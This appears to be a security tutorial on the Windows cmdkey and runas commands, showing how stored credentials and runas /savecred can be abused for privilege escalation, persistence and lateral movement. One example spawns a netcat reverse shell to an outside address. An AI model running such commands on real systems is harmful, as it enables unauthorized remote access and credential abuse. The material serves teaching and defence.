In Windows **cmdkey** and **runas** are powerful commands used for managing credentials and executing programs under different user accounts. While they can be useful to legitimate administrative tasks, they can also be exploited for **privilege escalation** and **persistence** in an attack scenerio.

---

### cmdkey 

thr ``cmdkey`` command is used to create, list or delete stored usernames and passwords. this can be useful for automating authentication to networked resources or system

#### Commands Overview:

1. **Adding Credentials**
    
    *   Adds credentials for remote system (``win8``) with the username ``DevNull`` and password ``123``

    ```cmd
    cmdkey /add:win8 /user:Devnull /pass:123
    ```

    *   Add credentials for the ``Administrator`` user on the system ``admin1``

    ```cmd
    cmdkey /add:admin1 /user:Administrator /pass:@assword123 
    ```

2.  **Listing Stored Credentials**

    *   List all stored credentials on the system

    ```cmd
    cmdkey /list
    ```

3.  **Deleting Credentials**


    *   Deletes the stored credentials for the specified target

    ```cmd
    cmdkey /delete:<target>
    ```

#### Security Consideration:

*   **Credential Lekage** Stored credentials may be misused if an attacker gains to the system. It's important to regularly clean stored credentials

*   **Network Persistence** Attackers can use ``cmdkey`` to store credentials for network resources, allowing them to access those system without needing to re-enter credentials

---

### runas

the ``runas`` command allows a user to execute a program under a different user account, typically used for running programs with different (non-elevated) privileges.

####    Command Overview

1.  **Running a command with another user's credentials

    *   Runs a comand to create a directory (``demo``) int he ``DevNull`` user's folder using credential of ``DevNull``

    ```cmd
    runas /user:WIN8\DevNull /savecred "C:\Windows\System32\cmd.exe /c mkdir C:\users\devnull\demo"
    ```

    *   **Executing command via ``runas`` :(Ping)**

     ```cmd
    runas /user:WIN8\DevNull /savecred "C:\Windows\System32\cmd.exe /c ping 8.8.8.8"
    ```


    * **Executing reverse shel via ``runas`` (NetCat)**

     ```cmd
    runas /user:WIN8\DevNull /savecred "C:\Windows\System32\cmd.exe /c nc63.exe -e cmd.exe 192.168.29.218 443"
    ```


#### Security Considerations

* **Privilege Escalation** if the user has access to ``runas`` with stored credentials (``/savecred``), they can escalate their privileges to an administrator or another higher-privileged account.

*   **Stored Credentials** the ``/savecred`` option stores credentials, which may lead to **credential theft** or unauthorized access

*   **Lateral Movement** by using ``runas`` with saved credentials attackers can potentially gain access to netoworked systems